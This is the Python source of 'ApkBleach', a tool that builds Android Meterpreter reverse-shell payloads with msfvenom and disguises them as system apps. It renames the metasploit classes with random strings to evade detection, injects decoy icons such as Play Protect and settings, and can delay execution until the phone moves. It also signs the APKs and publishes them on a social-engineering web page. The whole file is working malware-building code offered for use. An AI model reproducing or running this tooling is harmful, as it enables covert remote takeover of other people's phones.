#!/usr/bin/env python3

'''
Issues to fix:
	spaghetti code like a mother!!!!!
'''

import argparse
from argparse import RawTextHelpFormatter
from colorama import Fore, Style
import fileinput
import os
import os.path
from PIL import Image
import pkg_resources
import random
import re
import requests
import shutil
import string
import sys
import subprocess
from time import sleep
import urllib.request

class ApkBleach:

	def __init__(self):
		arg_parser = argparse.ArgumentParser(
			prog="ApkBleach",
			usage="\napkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 2 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk\n\napkbleach -g android/meterpreter/reverse_tcp LHOST=address LPORT=port -s 2 --edit-permissions --deploy-all\n\napkbleach --list-payloads\n apkbleach --list-icons\n apkbleach --clear-cache",
			formatter_class=RawTextHelpFormatter
			)
		arg_parser.add_argument("-g", nargs=3, dest='generate', metavar=("[PAYLOAD]","[LHOST]", "[LPORT]"), help="Generates a payload")
		arg_parser.add_argument("-s", dest='stealth', metavar=("[number of sessions to spawn 1-5]"), type=int, choices=range(1, 6), help="Executes payload on accelerometer activity instead of on open")
		arg_parser.add_argument("-i", nargs=1, dest='icon', metavar=("[BLEACH_icon..] or [path/to/custom/icon]"), help="Injects an icon")
		arg_parser.add_argument("-o", nargs=1, dest='output', metavar=("[output/path/for/file.apk]"), help="Path to output apk")
		arg_parser.add_argument("--edit-permissions", dest='edit_permissions', help="Enables permission editing in apk's manifest", action='store_true')
		arg_parser.add_argument("--deploy-all", dest='deploy_all',  help="Deploys each available icon as a payload with the apache2 server with a web interface", action='store_true')
		arg_parser.add_argument("--list-payloads", dest='list_payloads',  help="List available icons", action='store_true')
		arg_parser.add_argument("--list-icons", dest='list_icons',  help="List available icons", action='store_true')
		arg_parser.add_argument("--clear-cache", dest='clear_cache',  help="Allows prompt whether to keep package maintainers version apktool", action='store_true')


		args =  arg_parser.parse_args()

		if args.list_payloads:
			print(
				f'{Fore.YELLOW}PAYLOADS:\n\n'
				'\tRun a meterpreter server in Android. Tunnel communication over HTTP\n'
				f'{Fore.GREEN}\tandroid/meterpreter/reverse_http\n\n'
				f'{Fore.YELLOW}\tRun a meterpreter server in Android. Tunnel communication over HTTPS\n'
				f'{Fore.GREEN}\tandroid/meterpreter/reverse_https\n\n'
				f'{Fore.YELLOW}\tRun a meterpreter server in Android. Tunnel communication over TCP\n'
				f'{Fore.GREEN}\tandroid/meterpreter/reverse_tcp\n{Fore.WHITE}'
				)
			sys.exit()

		elif args.list_icons:
			print(
				f'{Fore.YELLOW}ICONS:\n'
				f'\t{Fore.GREEN}BLEACH_4g_signal\n'
				'\tBLEACH_settings\n'
				'\tBLEACH_memory\n'
				'\tBLEACH_signal\n'
				'\tBLEACH_secure\n'
				'\tBLEACH_android_studio\n'
				f'\tBLEACH_play_protect{Fore.WHITE}\n'
				
				)
			sys.exit()

		elif args.clear_cache:
			cache_path = pkg_resources.resource_filename(__name__, f'res/Cache')
			os.remove(f'{cache_path}/VersionKeep.txt') if os.path.isfile(f'{cache_path}/VersionKeep.txt') else False
			sys.exit()

		try:
			self.payload = args.generate[0]
			self.lhost = args.generate[1]
			self.lport = args.generate[2]
		except:
			subprocess.call(['bash', '-c', "apkbleach -h"])
			sys.exit()

		self.stealth_num = args.stealth
		self.stealth_path =  pkg_resources.resource_filename(__name__, f'res/Stealth') if self.stealth_num else False

		try:
			self.icon = args.icon[0]
			bleach_icons = [ i.strip('.png') for i in pkg_resources.resource_listdir("apkbleach", "res/Icons") ]

			if self.icon in bleach_icons:
				self.icon_path = pkg_resources.resource_filename(__name__, f'res/Icons/{self.icon}.png')
				# self.icon_path = __file__.replace('__main__.py', f'res/Icons/{self.icon}.png')
			else:
				try:
					Image.open(self.icon).format
					self.icon_path = self.icon
				except FileNotFoundError:
					sys.exit(f"\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] Could not validate icon check spelling or path\n{Fore.WHITE}")
				except:
					sys.exit(f"\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] Not a valid image format \n{Fore.WHITE}")
		except:
			pass

		if not args.deploy_all:
			self.output_file = args.output[0]

			self.app_name = self.output_file.split('.', -1)[-2].split('/')[-1] if self.output_file.split('.', -1)[-1] == 'apk' else sys.exit(f"\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] Your ouput path should be a .apk\n{Fore.WHITE}")
			
			if self.output_file.strip(f'{self.app_name}.apk') != '':
				self.app_path = self.output_file.strip(f'{self.app_name}.apk')
			else: 
				self.app_path = os.getcwd()

		self.edit_permissions = args.edit_permissions

		if args.deploy_all and args.icon:
			sys.exit(f'\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] You can not use -i and --deploy-all at the same time.\n\n--deploy-all will create the payload set for each BLEACH_icon available.{Fore.WHITE}\n')
		elif args.deploy_all and args.output:
			sys.exit(f'\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] You can not use -o and --deploy-all at the same time.\n\n--deploy-all will send all files to /var/www/html.\n')		
		else:
			self.deploy_all = args.deploy_all			

		letters = string.ascii_lowercase
		self.m_smali_dir = ''.join(random.choice(letters) for i in range(8))
		self.s_smali_dir = ''.join(random.choice(letters) for i in range(8))
		self.main_activity = ''.join(random.choice(letters) for i in range(8))
		self.main_service = ''.join(random.choice(letters) for i in range(8))
		self.main_broadcast_receiver = ''.join(random.choice(letters) for i in range(8))
		self.p_smali_file = ''.join(random.choice(letters) for i in range(8))
		self.scheme = ''.join(random.choice(letters) for i in range(8))


	def check_dependencies(self):
		apktool_version = os.popen("apktool --version 2>/dev/null").read().strip('\n') 
		apktool = subprocess.call(['bash', '-c', "dpkg-query -s apktool &>/dev/null"], stdout=subprocess.PIPE)
		zipalign = subprocess.call(['bash', '-c', "dpkg-query -s zipalign &>/dev/null"], stdout=subprocess.PIPE)
		jarsigner = subprocess.call(['bash', '-c', "jarsigner &>/dev/null"], stdout=subprocess.PIPE)

		if not os.path.isfile(pkg_resources.resource_filename(__name__, f'res/Cache/VersionKeep.txt')):
			if 'dirty' in apktool_version:
				print(f'{Fore.YELLOW}\n[{Fore.BLUE}*{Fore.YELLOW}] Upgrade apktool {apktool_version} !\n')
				print(f'{Fore.YELLOW}Detected package maintainers version of {Fore.BLUE}apktool {apktool_version} {Fore.YELLOW}are you sure its working?\n')
				print(f'{Fore.YELLOW}apktool {apktool_version} cause version error in the msfvenom -x option for template injection. We recomend you do not keep this version\n')
				print(f'{Fore.YELLOW}You will not see this message again if you choose to keep your current version unless you run apkbleach --clear-cache\n')
				keep_version = input(f'Would you like to keep your current version of apktool? [y/n]: ').upper()
				if keep_version == 'N' or keep_version == 'NO':
					subprocess.call(['bash', '-c', "sudo rm /usr/bin/apktool"], stdout=subprocess.PIPE)
					apktool = 1
				elif keep_version == 'Y' or keep_version == 'YES':
					with open(pkg_resources.resource_filename(__name__, f'res/Cache/VersionKeep.txt'), "a+") as f:
	  					f.write(f'Keeping apktool version {apktool_version}')

				
				for repeat in range(12):
					print("\033[A                                                                                        \033[A")
			else:
				keep_version = None

		if apktool == 1 or zipalign == 1 or jarsigner != 0:
			try:
				print(f"{Fore.YELLOW}Installing dependencies [{Fore.GREEN}*{Fore.YELLOW}]\n")
				requests.get("https://www.google.com/", timeout=5)
				subprocess.call(['bash', '-c', "sudo apt-get install zipalign -y"], stdout=subprocess.PIPE) if zipalign == 1 else False

				if apktool == 1:

					if keep_version == None: 
						subprocess.call(['bash', '-c', "sudo apt-get install apktool -y"], stdout=subprocess.PIPE)

					jar_file_url = 'https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool'
					apktool_file_url = 'https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.4.1.jar'

					with urllib.request.urlopen(jar_file_url) as response, open('apktool.jar', 'wb') as out_file:
						shutil.copyfileobj(response, out_file)

					with urllib.request.urlopen(apktool_file_url) as response, open('apktool', 'wb') as out_file:
						shutil.copyfileobj(response, out_file)

					subprocess.call(['bash', '-c', "sudo chmod a+x apktool*"], stdout=subprocess.PIPE)
					subprocess.call(['bash', '-c', "sudo mv apktool* /usr/bin"], stdout=subprocess.PIPE)

				repeat_num = 3

				if jarsigner != 0:
					print(f"{Fore.YELLOW}This may take a long time dont be alarmed! You're missing jarsigner which means default-jdk must be installed please wait...\n")
					subprocess.call(['bash', '-c', "sudo apt-get install openjdk-14-jdk -y"], stdout=subprocess.PIPE)
					repeat_num = 5


			except (requests.ConnectionError, requests.Timeout):
				sys.exit(f"\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] Some dependencies are missing. A internet connection is needed to install them. Please connect to the internet and try again\n{Fore.WHITE}")

			else:
				print(f"{Fore.YELLOW}Dependencies installed {Fore.GREEN}[*]")
				sleep(1)
				for repeat in range(repeat_num):
						print("\033[A                                                                               \033[A")

		else:
			print(f"{Fore.YELLOW}Dependencies met [{Fore.GREEN}*{Fore.YELLOW}]")
			sleep(1)
			print("\033[A                                       \033[A")


	def generate_payload(self):
		self.payload_path = pkg_resources.resource_filename(__name__, f'res/Cache')
		if self.payload and self.lhost and self.lport:
		
			subprocess.call(
				['bash', '-c',
				f"msfvenom -p {self.payload} {self.lhost} {self.lport} --platform android -a dalvik --pad-nops -f raw -o {self.payload_path}/bleach_me.apk 2>{self.payload_path}/apkbleach_error.log 1>/dev/null"]
			)

			with open(f'{self.payload_path}/apkbleach_error.log') as f:
				for line_num, line in enumerate(f):
					if 'Error:' in line:
						raise_error = 'Error'
						error = line
						return raise_error, error
		error = 'None'

		return error, False

	def decompile_apk(self):
		self.decompiled_path = f'{self.payload_path}/Decompiled'

		subprocess.call(['bash', '-c', "_SILENT_JAVA_OPTIONS=\"$_JAVAOPTIONS\" && unset _JAVA_OPTIONS && alias JAVA='java \"_SILENT_JAVA_OPTIONS\"'"])

		subprocess.call(['bash', '-c', f'apktool -q -f d {self.payload_path}/bleach_me.apk -o {self.decompiled_path}  &>/dev/null'])	


	def bleach_apk(self):

		if self.edit_permissions:

			print(f"{Fore.YELLOW}Permissions editor {Fore.BLUE}[*]".center(os.get_terminal_size().columns))
			print("\n")

			with open(f'{self.decompiled_path}/AndroidManifest.xml', 'r+') as manifest:

				for num_line, line in enumerate(manifest, 1):

					if "uses-permission" in line:
						permission = line.split(".", 1)[1].replace('"/>\n', "")
						sleep(.1)
						print(f"{Fore.YELLOW}Delete ? {Fore.GREEN}{permission}".center(os.get_terminal_size().columns))
						del_perm_ask = input(f"\n{Fore.YELLOW}Choose [y/n] the default is [n]: ").upper()

						for repeat in range(3):
							print("\033[A                                                                           \033[A")


						if del_perm_ask == "Y" or del_perm_ask == "YES":
							print(f"{Fore.YELLOW}Deleted {Fore.RED}{permission}".center(os.get_terminal_size().columns))
							sleep(.5)

							print("\033[A                                                                           \033[A")

							for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
										print(edit_line.replace(line, ''), end='')
				for repeat in range(3):
							print("\033[A                                                                           \033[A")

		if self.stealth_path:
			os.remove(f'{self.decompiled_path}/smali/com/metasploit/stage/MainActivity.smali')

			shutil.copyfile(f'{self.stealth_path}/MainActivity.smali', f'{self.decompiled_path}/smali/com/metasploit/stage/MainActivity.smali')

			if self.stealth_num > 1:
				for edit_line in fileinput.input([f'{self.decompiled_path}/smali/com/metasploit/stage/MainActivity.smali'], inplace=True):
					print(
						edit_line.replace(
							'iget v0, p0, Lcom/metasploit/stage/MainActivity;->ran:I', 
							f'iget v0, p0, Lcom/metasploit/stage/MainActivity;->ran:I\n\n\tconst/4 v1, 0x{self.stealth_num}'), 
						end=''
					)

		if self.deploy_all:

			self.deploy_list = [ i.strip('.png').strip('BLEACH_') for i in pkg_resources.resource_listdir(__name__, "res/Icons")  ]

			for all_available in self.deploy_list:

				try:
					shutil.copytree(f'{self.decompiled_path}', f'{self.payload_path}/{all_available}')
				except FileExistsError:
					shutil.rmtree(f'{self.payload_path}/{all_available}')
					shutil.copytree(f'{self.decompiled_path}', f'{self.payload_path}/{all_available}')


				# Changing the apps name to what user provided 
				for edit_line in fileinput.input([f'{self.payload_path}/{all_available}/res/values/strings.xml'], inplace=True):
					print(edit_line.replace('MainActivity', f'{all_available}'), end='')

				# Change package path in manifest
				for edit_line in fileinput.input([f'{self.payload_path}/{all_available}/AndroidManifest.xml'], inplace=True):
					print(edit_line.replace('com.metasploit.stage', f'com.{self.m_smali_dir}.{self.s_smali_dir}'), end='')

				# change Scheme in manifest
				for edit_line in fileinput.input([f'{self.payload_path}/{all_available}/AndroidManifest.xml'], inplace=True):
					print(edit_line.replace('android:scheme=\"metasploit\"', f'android:scheme=\"{self.scheme}\"'), end='')

				# change MainActivity name in manifest
				for edit_line in fileinput.input([f'{self.payload_path}/{all_available}/AndroidManifest.xml'], inplace=True):
					print(edit_line.replace('MainActivity', f'{self.main_activity}'), end='')

				# change MainService name in manifest
				for edit_line in fileinput.input([f'{self.payload_path}/{all_available}/AndroidManifest.xml'], inplace=True):
					print(edit_line.replace('MainService', f'{self.main_service}'), end='')

				# change MainBroadcastReceiver name in manifest
				for edit_line in fileinput.input([f'{self.payload_path}/{all_available}/AndroidManifest.xml'], inplace=True):
					print(edit_line.replace('MainBroadcastReceiver', f'{self.main_broadcast_receiver}'), end='')

				# Renaming apk directories
				os.rename(rf'{self.payload_path}/{all_available}/smali/com/metasploit', rf'{self.payload_path}/{all_available}/smali/com/{self.m_smali_dir}')
				os.rename(rf'{self.payload_path}/{all_available}/smali/com/{self.m_smali_dir}/stage', rf'{self.payload_path}/{all_available}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}')

				p_files_path = f"{self.payload_path}/{all_available}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}"

				# Renaming payload files named MainActivity.smali, MainBroadcastReceier.smali, MainService.smali, Payload.smali
				os.rename(rf'{p_files_path}/MainActivity.smali', rf'{p_files_path}/{self.main_activity}.smali')
				os.rename(rf'{p_files_path}/MainBroadcastReceiver.smali', rf'{p_files_path}/{self.main_broadcast_receiver}.smali')
				os.rename(rf'{p_files_path}/MainService.smali', rf'{p_files_path}/{self.main_service}.smali')
				os.rename(rf'{p_files_path}/Payload.smali', rf'{p_files_path}/{self.p_smali_file}.smali')

				# Changing referances of metasploit, stage, MainActivity, MainService, MainBroadcastReceiver, Payload in all payload files
				for file in os.listdir(p_files_path):
					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
						print(edit_line.replace('metasploit', f'{self.m_smali_dir}'), end='')

					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
						print(edit_line.replace('stage', f'{self.s_smali_dir}'), end='')

					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
						print(edit_line.replace('MainActivity', f'{self.main_activity}'), end='')

					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
						print(edit_line.replace('MainService', f'{self.main_service}'), end='')

					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
						print(edit_line.replace('MainBroadcastReceiver', f'{self.main_broadcast_receiver}'), end='')

					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
						print(edit_line.replace('Payload', f'{self.p_smali_file}'), end='')	

		else:
 
			# Changing the apps name to what user provided 
			for edit_line in fileinput.input([f'{self.decompiled_path}/res/values/strings.xml'], inplace=True):
				print(edit_line.replace('MainActivity', f'{self.app_name}'), end='')

			# Change package path in manifest
			for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
				print(edit_line.replace('com.metasploit.stage', f'com.{self.m_smali_dir}.{self.s_smali_dir}'), end='')

			# change Scheme in manifest
			for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
				print(edit_line.replace('android:scheme=\"metasploit\"', f'android:scheme=\"{self.scheme}\"'), end='')

			# change MainActivity name in manifest
			for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
				print(edit_line.replace('MainActivity', f'{self.main_activity}'), end='')

			# change MainService name in manifest
			for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
				print(edit_line.replace('MainService', f'{self.main_service}'), end='')

			# change MainBroadcastReceiver name in manifest
			for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
				print(edit_line.replace('MainBroadcastReceiver', f'{self.main_broadcast_receiver}'), end='')

			# Renaming apk directories
			os.rename(rf'{self.decompiled_path}/smali/com/metasploit', rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}')
			os.rename(rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}/stage', rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}')

			p_files_path = f"{self.decompiled_path}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}"

			# Renaming payload files named MainActivity.smali, MainBroadcastReceier.smali, MainService.smali, Payload.smali
			os.rename(rf'{p_files_path}/MainActivity.smali', rf'{p_files_path}/{self.main_activity}.smali')
			os.rename(rf'{p_files_path}/MainBroadcastReceiver.smali', rf'{p_files_path}/{self.main_broadcast_receiver}.smali')
			os.rename(rf'{p_files_path}/MainService.smali', rf'{p_files_path}/{self.main_service}.smali')
			os.rename(rf'{p_files_path}/Payload.smali', rf'{p_files_path}/{self.p_smali_file}.smali')

			# Changing referances of metasploit, stage, MainActivity, MainService, MainBroadcastReceiver, Payload in all payload files
			for file in os.listdir(p_files_path):
				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
					print(edit_line.replace('metasploit', f'{self.m_smali_dir}'), end='')

				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
					print(edit_line.replace('stage', f'{self.s_smali_dir}'), end='')

				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
					print(edit_line.replace('MainActivity', f'{self.main_activity}'), end='')

				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
					print(edit_line.replace('MainService', f'{self.main_service}'), end='')

				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
					print(edit_line.replace('MainBroadcastReceiver', f'{self.main_broadcast_receiver}'), end='')

				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
					print(edit_line.replace('Payload', f'{self.p_smali_file}'), end='')	


	def icon_inject(self):
		if self.deploy_all:

			self.deploy_list = [ i.strip('.png').strip('BLEACH_') for i in pkg_resources.resource_listdir(__name__, "res/Icons")  ]

			for all_available in self.deploy_list:
				icon_path = pkg_resources.resource_filename(__name__, f'res/Icons/BLEACH_{all_available}.png')
				for line in fileinput.input([f'{self.payload_path}/{all_available}/AndroidManifest.xml'], inplace=True):
					print(line.replace(
						'<application android:label=\"@string/app_name\">', 
						'<application android:label=\"@string/app_name\" android:icon=\"@drawable/icon\" >'
						), end='')

				subprocess.call([
					'bash', 
					'-c', 
					f"mkdir {self.payload_path}/{all_available}/res/drawable-ldpi-v4 {self.payload_path}/{all_available}/res/drawable-mdpi-v4 {self.payload_path}/{all_available}/res/drawable-hdpi-v4"
					])

				icon_to_inject = Image.open(icon_path)

				ldpi = icon_to_inject.resize((36, 36))
				mdpi = icon_to_inject.resize((48, 48))
				hdpi = icon_to_inject.resize((72, 72))

				ldpi.save(f'{self.payload_path}/{all_available}/res/drawable-ldpi-v4/icon.png')
				mdpi.save(f'{self.payload_path}/{all_available}/res/drawable-mdpi-v4/icon.png')
				hdpi.save(f'{self.payload_path}/{all_available}/res/drawable-hdpi-v4/icon.png')
		else:

			for line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
				print(line.replace(
					'<application android:label=\"@string/app_name\">', 
					'<application android:label=\"@string/app_name\" android:icon=\"@drawable/icon\" >'
					), end='')

			subprocess.call([
				'bash', 
				'-c', 
				f"mkdir {self.decompiled_path}/res/drawable-ldpi-v4 {self.decompiled_path}/res/drawable-mdpi-v4 {self.decompiled_path}/res/drawable-hdpi-v4"
				])

			icon_to_inject = Image.open(self.icon_path)

			ldpi = icon_to_inject.resize((36, 36))
			mdpi = icon_to_inject.resize((48, 48))
			hdpi = icon_to_inject.resize((72, 72))

			ldpi.save(f'{self.decompiled_path}/res/drawable-ldpi-v4/icon.png')
			mdpi.save(f'{self.decompiled_path}/res/drawable-mdpi-v4/icon.png')
			hdpi.save(f'{self.decompiled_path}/res/drawable-hdpi-v4/icon.png')


	def rebuild_apk(self):
		if self.deploy_all:
			deploy_resources_path = pkg_resources.resource_filename(__name__, f'res') 
			deploy_list = [ i.strip('.png').strip('BLEACH_') for i in pkg_resources.resource_listdir(__name__, "res/Icons") ]

			for all_available in deploy_list:
				subprocess.call(['bash', '-c', f'apktool -q b {self.payload_path}/{all_available} -o {self.payload_path}/{all_available}_temp.apk &>/dev/null'])
				subprocess.call(['bash', '-c', f'yes "yes" | keytool -genkey -v -keystore {self.payload_path}/{all_available}.keystore -alias {all_available} -keyalg RSA -storepass password -keysize 2048 -keypass password -validity 10000 &>/dev/null'])
				subprocess.call(['bash', '-c', f'jarsigner -sigalg SHA1withRSA -digestalg SHA1 -storepass password -keypass password -keystore {self.payload_path}/{all_available}.keystore {self.payload_path}/{all_available}_temp.apk {all_available} &>/dev/null'])
				subprocess.call(['bash', '-c', f'zipalign -f 4 {self.payload_path}/{all_available}_temp.apk {self.payload_path}/{all_available}.apk'])

				if os.listdir('/var/www/html') == []:
					subprocess.call(['bash', '-c', f"sudo cp -r {deploy_resources_path}/Android-SE /var/www/html "], stdout=subprocess.PIPE)
					subprocess.call(['bash', '-c', f"sudo mv /var/www/html/Android-SE/index.html /var/www/html "], stdout=subprocess.PIPE)
					subprocess.call(['bash', '-c', f"sudo mv /var/www/html/Android-SE/css /var/www/html "], stdout=subprocess.PIPE)
					subprocess.call(['bash', '-c', f"sudo mv {self.payload_path}/{all_available}.apk /var/www/html/Android-SE/msf_apps "], stdout=subprocess.PIPE)
				else:
					if not os.path.isdir('/var/www/html/Android-SE'):
						subprocess.call(['bash', '-c', f"sudo cp -r /var/www/html /var/www/html_backup "], stdout=subprocess.PIPE)
						subprocess.call(['bash', '-c', f"sudo rm -r /var/www/html/*"], stdout=subprocess.PIPE)
						subprocess.call(['bash', '-c', f"sudo cp -r {deploy_resources_path}/Android-SE /var/www/html "], stdout=subprocess.PIPE)
						subprocess.call(['bash', '-c', f"sudo mv /var/www/html/Android-SE/index.html /var/www/html "], stdout=subprocess.PIPE)
						subprocess.call(['bash', '-c', f"sudo mv /var/www/html/Android-SE/css /var/www/html "], stdout=subprocess.PIPE)
						subprocess.call(['bash', '-c', f"sudo mv {self.payload_path}/{all_available}.apk /var/www/html/Android-SE/msf_apps "], stdout=subprocess.PIPE)
					else:
						subprocess.call(['bash', '-c', f"sudo mv {self.payload_path}/{all_available}.apk /var/www/html/Android-SE/msf_apps "], stdout=subprocess.PIPE)

			subprocess.call(['bash', '-c', f"sudo /etc/init.d/apache2 start &>/dev/null"], stdout=subprocess.PIPE)

		else:
			subprocess.call(['bash', '-c', f'apktool -q b {self.decompiled_path} -o {self.payload_path}/temp.apk &>/dev/null'])
			subprocess.call(['bash', '-c', f'yes "yes" | keytool -genkey -v -keystore {self.payload_path}/{self.app_name}.keystore -alias {self.app_name} -keyalg RSA -storepass password -keysize 2048 -keypass password -validity 10000 &>/dev/null'])
			subprocess.call(['bash', '-c', f'jarsigner -sigalg SHA1withRSA -digestalg SHA1 -storepass password -keypass password -keystore {self.payload_path}/{self.app_name}.keystore {self.payload_path}temp.apk {self.app_name} &>/dev/null'])
			subprocess.call(['bash', '-c', f'zipalign -f 4 {self.payload_path}/temp.apk {self.payload_path}/{self.app_name}.apk'])

			
